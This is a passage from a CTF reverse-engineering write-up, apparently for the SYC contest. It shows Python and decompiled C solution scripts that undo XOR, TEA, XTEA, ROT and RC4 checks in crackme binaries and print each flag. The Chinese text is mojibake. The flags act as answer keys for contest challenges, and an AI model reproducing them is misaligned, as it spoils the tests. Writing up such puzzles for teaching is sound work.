class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">56</span>]</span><br><span class="line">table = <span class="string">&#x27;01234_asdzxcpoityumnbAOZWXGMY&#x27;</span></span><br><span class="line">flag = [table[num.index(m[i])] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">25</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"></span><br><span class="line"><span class="comment"># xtd4co_ymiunbbx3Aypsmbzii</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;xtd4co_ymiunbbx3Aypsmbzii&#125;</code></p><p>â€‹    </p><h3 id="å¹¸è¿æ•°å­—"><a href="#å¹¸è¿æ•°å­—" class="headerlink" title="å¹¸è¿æ•°å­—"></a>å¹¸è¿æ•°å­—</h3><blockquote><p>è¯•è¯•ä»Šå¤©çš„è¿åŠ¿</p></blockquote><p>æŒ‰é€»è¾‘è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">13</span>,   <span class="number">7</span>,  <span class="number">29</span>,  <span class="number">37</span>,  <span class="number">29</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">57</span>,  <span class="number">44</span>,  <span class="number">63</span>, </span><br><span class="line">   <span class="number">42</span>,  <span class="number">43</span>,  <span class="number">50</span>,  <span class="number">63</span>,  <span class="number">42</span>,  <span class="number">55</span>, <span class="number">110</span>,  <span class="number">48</span>,  <span class="number">48</span>,  <span class="number">48</span>, </span><br><span class="line">   <span class="number">48</span>,  <span class="number">45</span>,   <span class="number">1</span>,   <span class="number">7</span>,  <span class="number">49</span>,  <span class="number">43</span>,   <span class="number">1</span>,  <span class="number">57</span>,  <span class="number">31</span>,  <span class="number">59</span>, </span><br><span class="line">   <span class="number">45</span>,  <span class="number">45</span>,  <span class="number">27</span>,  <span class="number">58</span>,   <span class="number">1</span>,  <span class="number">12</span>, <span class="number">111</span>,  <span class="number">57</span>,  <span class="number">54</span>,  <span class="number">42</span>, </span><br><span class="line">   <span class="number">35</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">return</span> k*(k+<span class="number">1</span>)//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    x = [data[i]^(cal(k)%<span class="number">0xd3</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">41</span>)]</span><br><span class="line">    <span class="keyword">if</span> x[-<span class="number">1</span>] == <span class="number">125</span>:</span><br><span class="line">        <span class="built_in">print</span>(k, <span class="built_in">bytes</span>(x))</span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;C0ngratulati0nnnns_You_gAessEd_R1ght&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="å¬è¯´cppå¾ˆéš¾ï¼Ÿ"><a href="#å¬è¯´cppå¾ˆéš¾ï¼Ÿ" class="headerlink" title="å¬è¯´cppå¾ˆéš¾ï¼Ÿ"></a>å¬è¯´cppå¾ˆéš¾ï¼Ÿ</h3><blockquote><p>xxxå¸ˆå‚…å¶ç„¶å¬åˆ°æœ‰äººè¯´cppå¾ˆéš¾ï¼ŒçœŸçš„å¾ˆéš¾å—ï¼Ÿä¸ä¼šå§ï¼Œä¸ä¼šå§ã€‚äºæ˜¯ï¼ŒXå¸ˆå‚…è¿å¿™å‡ºäº†ä¸€é“ç»™å¤§ä¼™å„¿æ¶¨æ¶¨ä¿¡å¿ƒã€‚</p></blockquote><p>åŠ¨è°ƒï¼Œå¾—åˆ°é€»è¾‘ä¸º $[(9+1) \oplus (f_i+10)]-9-1$ã€‚</p><p>çˆ†ç ´è¿˜åŸï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">77</span>, <span class="number">95</span>, <span class="number">61</span>, -<span class="number">123</span>, <span class="number">55</span>, <span class="number">104</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">39</span>, <span class="number">104</span>, <span class="number">81</span>, <span class="number">89</span>, <span class="number">127</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">89</span>, <span class="number">115</span>, <span class="number">87</span>, <span class="number">85</span>, <span class="number">91</span>, <span class="number">89</span>, <span class="number">111</span>, <span class="number">106</span>, <span class="number">89</span>, <span class="number">39</span>, <span class="number">87</span>, <span class="number">114</span>, <span class="number">87</span>, <span class="number">79</span>, <span class="number">87</span>, <span class="number">120</span>, <span class="number">120</span>, -<span class="number">125</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cal</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> ((<span class="number">9</span>+<span class="number">1</span>)^(x+<span class="number">10</span>))-<span class="number">9</span>-<span class="number">1</span></span><br><span class="line"></span><br><span class="line">f=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">if</span> cal(j) == c[i]:</span><br><span class="line">            f.append(j)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(f))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYCAnma1nG_y0u_maKe_it_1alaIa~~&#x27;</span></span><br></pre></td></tr></table></figure><p>flagï¼š<code>SYC&#123;Anma1nG_y0u_maKe_it_1alaIa~~&#125;</code></p><p>â€‹    </p><h3 id="ç æ ‘"><a href="#ç æ ‘" class="headerlink" title="ç æ ‘"></a>ç æ ‘</h3><blockquote><p>ä½ ä¼šå®‰å“å—?æˆ‘åæ­£ä¸ä¼š</p></blockquote><p>jadxæŸ¥çœ‹apkï¼Œç”¨IDAåœ¨soæ–‡ä»¶ä¸­æŸ¥çœ‹ä¸»è¦é€»è¾‘ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">_BOOL8 __fastcall <span class="title function_">Java_com_sky_ezreeeee_MainActivity_I0o0I</span><span class="params">(__int64 a1, __int64 a2, __int64 a3, __int64 a4)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  __int64 v6; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  _BOOL4 v7; <span class="comment">// [rsp+1Ch] [rbp-54h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v9; <span class="comment">// [rsp+20h] [rbp-50h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 *v10; <span class="comment">// [rsp+28h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">40</span>]; <span class="comment">// [rsp+40h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v12; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v10 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a3);</span><br><span class="line">  v9 = (<span class="type">unsigned</span> __int8 *)jstring_2unsigchar(a1, a4);</span><br><span class="line">  v6 = A0OWO0A(v10, v9);</span><br><span class="line">  <span class="built_in">memcpy</span>(dest, &amp;unk_14900, <span class="number">0x23</span>uLL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    v7 = *(<span class="type">unsigned</span> __int8 *)(v6 + i) == (<span class="type">unsigned</span> __int8)dest[i];</span><br><span class="line">  <span class="keyword">return</span> v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int8 *__fastcall <span class="title function_">A0OWO0A</span><span class="params">(<span class="type">unsigned</span> __int8 *a1, <span class="type">const</span> <span class="type">unsigned</span> __int8 *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">34</span>; ++i )</span><br><span class="line">    a1[i] ^= a2[i % <span class="number">7</span>];</span><br><span class="line">  <span class="keyword">return</span> a1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•å¼‚æˆ–è¿ç®—ï¼Œæå–å¯†æ–‡ï¼š<code>002020171B360E362617042A2907261552332D0F3A271106330746173D0A3C382E2218</code>ï¼Œå¯†é’¥ï¼š<code>Syclove</code>ï¼ŒCyberchefå¼‚æˆ–æ“ä½œå¾— <code>SYC&#123;t@ke_thE_bul1_By_the_h0rns_TAT&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="flower-or-tea"><a href="#flower-or-tea" class="headerlink" title="flower-or-tea"></a>flower-or-tea</h3><blockquote><p>Flower ?or tea? or flower tea?</p></blockquote><p>å»é™¤jmpèŠ±æŒ‡ä»¤ï¼Œå…¨å±€æ›¿æ¢ <code>74 03 75 01 XX</code> ä¸º <code>90 90 90 90 90</code> (NOP)ã€‚</p><p>çœ‹ä¼ªç ä¸ºé­”æ”¹XTEAç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">75</span>,  <span class="number">70</span>, <span class="number">249</span>, <span class="number">154</span>, <span class="number">158</span>, <span class="number">184</span>,  <span class="number">23</span>, <span class="number">196</span>,  <span class="number">19</span>, <span class="number">167</span>, </span><br><span class="line">   <span class="number">23</span>, <span class="number">178</span>, <span class="number">232</span>, <span class="number">169</span>,  <span class="number">59</span>, <span class="number">201</span>,  <span class="number">78</span>, <span class="number">228</span>, <span class="number">243</span>, <span class="number">148</span>, </span><br><span class="line">  <span class="number">181</span>,  <span class="number">42</span>, <span class="number">204</span>, <span class="number">181</span>,  <span class="number">44</span>, <span class="number">228</span>,  <span class="number">81</span>,  <span class="number">68</span>, <span class="number">154</span>,  <span class="number">40</span>, </span><br><span class="line">  <span class="number">138</span>, <span class="number">122</span>,   <span class="number">8</span>, <span class="number">208</span>, <span class="number">200</span>,  <span class="number">83</span>,  <span class="number">73</span>, <span class="number">123</span>,  <span class="number">17</span>, <span class="number">110</span>, </span><br><span class="line">  <span class="number">148</span>, <span class="number">215</span>, <span class="number">255</span>, <span class="number">155</span>, <span class="number">249</span>,  <span class="number">45</span>, <span class="number">255</span>,  <span class="number">94</span>,  <span class="number">49</span>,  <span class="number">37</span>, </span><br><span class="line">  <span class="number">231</span>,  <span class="number">23</span>, <span class="number">121</span>, <span class="number">153</span>, <span class="number">189</span>, <span class="number">223</span>,  <span class="number">58</span>,  <span class="number">27</span>, <span class="number">135</span>, <span class="number">143</span>, </span><br><span class="line">  <span class="number">172</span>, <span class="number">197</span>, <span class="number">232</span>, <span class="number">115</span>, <span class="number">166</span>, <span class="number">112</span>, <span class="number">134</span>, <span class="number">178</span>, <span class="number">105</span>, <span class="number">163</span>, </span><br><span class="line">  <span class="number">246</span>,  <span class="number">90</span>,  <span class="number">36</span>, <span class="number">218</span>, <span class="number">247</span>,  <span class="number">44</span>, <span class="number">175</span>, <span class="number">102</span>, <span class="number">123</span>,  <span class="number">52</span>, </span><br><span class="line">   <span class="number">96</span>,  <span class="number">77</span>, <span class="number">200</span>, <span class="number">185</span>,  <span class="number">47</span>, <span class="number">145</span>,  <span class="number">30</span>, <span class="number">145</span>, <span class="number">155</span>,  <span class="number">47</span>, </span><br><span class="line">   <span class="number">90</span>, <span class="number">189</span>,  <span class="number">58</span>, <span class="number">115</span>, <span class="number">150</span>, <span class="number">203</span>, <span class="number">190</span>, <span class="number">104</span>, <span class="number">153</span>, <span class="number">197</span>, </span><br><span class="line">  <span class="number">233</span>,  <span class="number">19</span>,   <span class="number">0</span>, <span class="number">160</span>, <span class="number">164</span>,  <span class="number">78</span>,  <span class="number">47</span>, <span class="number">193</span>,  <span class="number">16</span>,  <span class="number">58</span>, </span><br><span class="line">  <span class="number">134</span>, <span class="number">222</span>, <span class="number">148</span>, <span class="number">213</span>, <span class="number">196</span>, <span class="number">160</span>,  <span class="number">60</span>, <span class="number">152</span>, <span class="number">128</span>,  <span class="number">67</span>, </span><br><span class="line">   <span class="number">72</span>, <span class="number">118</span>,  <span class="number">47</span>, <span class="number">126</span>, <span class="number">137</span>, <span class="number">220</span>,  <span class="number">77</span>, <span class="number">229</span>, <span class="number">144</span>, <span class="number">166</span>, </span><br><span class="line">   <span class="number">39</span>,  <span class="number">63</span>, <span class="number">153</span>,  <span class="number">49</span>, <span class="number">141</span>, <span class="number">181</span>,  <span class="number">23</span>, <span class="number">229</span>,  <span class="number">74</span>,  <span class="number">96</span>, </span><br><span class="line">  <span class="number">132</span>,  <span class="number">57</span>, <span class="number">144</span>, <span class="number">156</span>, <span class="number">129</span>,  <span class="number">68</span>, <span class="number">224</span>, <span class="number">244</span>, <span class="number">255</span>, <span class="number">237</span>, </span><br><span class="line">  <span class="number">244</span>,  <span class="number">60</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">32</span>,<span class="number">27</span>,<span class="number">39</span>,<span class="number">44</span>]</span><br><span class="line">rounds = <span class="number">54</span></span><br><span class="line">delta = <span class="number">0x31415927</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = delta * rounds</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v1 -= (((v0 &lt;&lt; <span class="number">4</span>) ^ (v0 &gt;&gt; <span class="number">5</span>)) + v0) ^ (x + k[x &amp; <span class="number">3</span>])</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= (((v1 &lt;&lt; <span class="number">4</span>) ^ (v1 &gt;&gt; <span class="number">5</span>)) + v1) ^ (x + k[(x &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]) ^ x</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">fl = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">fr = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>][::-<span class="number">1</span>]</span><br><span class="line">    m = decrypt(cc)</span><br><span class="line">    fr = long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>] + fr</span><br><span class="line">    fl += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(fl)</span><br><span class="line"><span class="built_in">print</span>(fr)</span><br><span class="line"><span class="built_in">print</span>(fl+fr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;D0_Yov_1ike_To_dRink_Flow3r_teA??&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="mySelf"><a href="#mySelf" class="headerlink" title="mySelf"></a>mySelf</h3><blockquote><p>Why so serious?</p></blockquote><p>åŠ¨è°ƒï¼Œå¾—åˆ°ç¬¬äºŒä¸ªå¯¹è¾“å…¥çš„åŠ å¯†é€»è¾‘ä¸ºTEAç®—æ³•ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">c = [<span class="number">240</span>, <span class="number">249</span>, <span class="number">189</span>, <span class="number">189</span>, <span class="number">196</span>, <span class="number">148</span>,  <span class="number">97</span>, <span class="number">226</span>,  <span class="number">37</span>, <span class="number">145</span>, </span><br><span class="line">  <span class="number">121</span>, <span class="number">128</span>,  <span class="number">25</span>, <span class="number">194</span>,  <span class="number">15</span>,  <span class="number">31</span>,  <span class="number">21</span>,  <span class="number">24</span>, <span class="number">106</span>, <span class="number">235</span>, </span><br><span class="line">  <span class="number">197</span>, <span class="number">114</span>, <span class="number">245</span>, <span class="number">132</span>, <span class="number">133</span>,  <span class="number">58</span>, <span class="number">204</span>,  <span class="number">64</span>, <span class="number">187</span>,  <span class="number">42</span>, </span><br><span class="line">  <span class="number">163</span>, <span class="number">210</span>]</span><br><span class="line">c = [bytes_to_long(<span class="built_in">bytes</span>(c[<span class="number">4</span>*i:<span class="number">4</span>*i+<span class="number">4</span>])[::-<span class="number">1</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">4</span>)]</span><br><span class="line"><span class="built_in">print</span>(c)</span><br><span class="line"></span><br><span class="line">k = [<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    v0 = v[<span class="number">0</span>]</span><br><span class="line">    v1 = v[<span class="number">1</span>]</span><br><span class="line">    x = <span class="number">0x9E3779B9</span> * <span class="number">32</span></span><br><span class="line">    delta = <span class="number">0x9E3779B9</span></span><br><span class="line">    k0 = k[<span class="number">0</span>]</span><br><span class="line">    k1 = k[<span class="number">1</span>]</span><br><span class="line">    k2 = k[<span class="number">2</span>]</span><br><span class="line">    k3 = k[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1 -= ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + x) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3)</span><br><span class="line">        v1 = v1 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        v0 -= ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + x) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1)</span><br><span class="line">        v0 = v0 &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        x -= delta</span><br><span class="line">        x = x &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    v[<span class="number">0</span>] = v0</span><br><span class="line">    v[<span class="number">1</span>] = v1</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)//<span class="number">2</span>):</span><br><span class="line">    cc = c[<span class="number">2</span>*i:<span class="number">2</span>*i+<span class="number">2</span>]</span><br><span class="line">    m = decrypt(cc,k)</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">0</span>])[::-<span class="number">1</span>]</span><br><span class="line">    flag += long_to_bytes(m[<span class="number">1</span>])[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SYC&#123;H0w_7o_R@te_YOurs31f_iNtRo?&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h3><blockquote><p>ç¾ä¸½çš„IDAæ§åˆ¶æµè§†å›¾ like Rainbow!</p></blockquote><p>LLVMå»å¹³å¦åŒ–ï¼š</p><p><code>python3 deflat.py -f ./rainbow --addr 0x401160</code></p><p>å†ç®€å•é€†å›å»ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = [<span class="number">0x627B44508E415865</span>,<span class="number">0x847D6C49547E4A57</span>,<span class="number">0x4877646060955B4F</span>,<span class="number">0x622D3C689F7B4D7D</span>]</span><br><span class="line">cc = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> c:</span><br><span class="line">    cc += <span class="built_in">list</span>(long_to_bytes(k)[::-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(cc)):</span><br><span class="line">    cc[i] ^= i</span><br><span class="line">    <span class="keyword">if</span> i%<span class="number">3</span> == <span class="number">0</span>:</span><br><span class="line">        cc[i] -= <span class="number">18</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(cc))</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;TAke_1t_3asy_Just_a_STart!!&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="å°é»„é¸­"><a href="#å°é»„é¸­" class="headerlink" title="å°é»„é¸­"></a>å°é»„é¸­</h3><blockquote><p>å°é»„é¸­çš„é’¥åŒ™è¢«ä¸€ä¸ªå«æ¯—å¤–çš„å¤§åé¸­å·èµ°äº†,ä½ èƒ½å¸®å®ƒæ‰¾åˆ°é’¥åŒ™å—?</p></blockquote><p>pythonåç¼–è¯‘ï¼Œå¾—åˆ°1.pycï¼Œä¿®å¤ä¸º3.7çš„æ–‡ä»¶å¤´ <code>550d0d0a</code>ï¼Œè¿˜åŸpythonä»£ç ã€‚</p><p>å¯†æ–‡ï¼š<code>~h|p4gs`gJdN`thPwR`jDn`te1w`2|RNH</code></p><p>Cyberchefè§£ï¼šROT93+Reverse+ROT12</p><p>å¾—åˆ°ï¼š<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3a&#123;s&#125;</code></p><p>ä¿®æ­£ä¸€ä¸‹å¾—flagï¼š<code>SYC&#123;1_h0pe_yOu_ChAse_YoUr_dr3ams&#125;</code></p><p>â€‹    </p><h3 id="å¯»æ‰¾åˆéŸ³æœªæ¥"><a href="#å¯»æ‰¾åˆéŸ³æœªæ¥" class="headerlink" title="å¯»æ‰¾åˆéŸ³æœªæ¥"></a>å¯»æ‰¾åˆéŸ³æœªæ¥</h3><blockquote><p>æ­£ç¡®çš„è¾“å…¥å³å¯è§£æ•‘Miku~(å›¾æœ‰ç‚¹å¤§äº†å¿ä¸€ä¸‹)</p></blockquote><p>Goç¨‹åºï¼Œä»£ç é€»è¾‘ä¸ºRC4ï¼ŒåŠ¨è°ƒå¾— <code>key=&#39;C&#39;*18</code>ã€‚</p><p>è¾“å…¥é—®é¢˜ <code>åˆéŸ³æœªæ¥è‰²æ˜¯å¤šå°‘?(è¾“å…¥ä¸º16è¿›åˆ¶,å¦‚0x123abcåˆ™è¾“å…¥123abc)</code> ç­”æ¡ˆ <code>39C5BB</code>ï¼Œæå–å¯†æ–‡ï¼ŒRC4è§£å¯†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">N = <span class="number">256</span></span><br><span class="line">S = [<span class="number">0</span>] * N</span><br><span class="line">key = <span class="string">&#x27;C&#x27;</span>*<span class="number">18</span></span><br><span class="line">Key = [<span class="number">0</span>] * N</span><br><span class="line"></span><br><span class="line">t = [ <span class="number">0x25</span>, <span class="number">0x6F</span>, <span class="number">0x3D</span>, <span class="number">0x6C</span>, <span class="number">0xF9</span>, <span class="number">0xE0</span>, <span class="number">0xCF</span>, <span class="number">0x3F</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, </span><br><span class="line">  <span class="number">0xC6</span>, <span class="number">0x7B</span>, <span class="number">0x81</span>, <span class="number">0xBF</span>, <span class="number">0x55</span>, <span class="number">0x4F</span>, <span class="number">0x0D</span>, <span class="number">0x99</span>, <span class="number">0x87</span>, <span class="number">0x47</span>, </span><br><span class="line">  <span class="number">0x48</span>, <span class="number">0xF7</span>, <span class="number">0xB9</span>, <span class="number">0x98</span>, <span class="number">0xFB</span>, <span class="number">0x1B</span>, <span class="number">0x22</span>, <span class="number">0xEC</span>, <span class="number">0x84</span>, <span class="number">0x23</span>, </span><br><span class="line">  <span class="number">0xFD</span>, <span 